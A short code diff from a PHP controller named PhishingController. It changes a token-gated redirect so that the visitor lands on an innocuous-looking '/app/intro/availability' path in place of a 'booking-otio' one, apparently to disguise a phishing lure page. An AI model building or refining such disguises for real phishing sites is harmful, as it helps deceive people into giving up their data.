@@ -176,7 +176,7 @@ class PhishingController extends Controller
         if (!session('_otio_token') || $token !== session('_otio_token')) {
             $newToken = Str::random(200);
             session(['_otio_token' => $newToken]);
-            return redirect('/booking-otio-' . $newToken);
+            return redirect('/app/intro/availability-' . $newToken);
         }
         return view('booking-otio', [
             'metaBasePath' => $session['metaBasePath'],
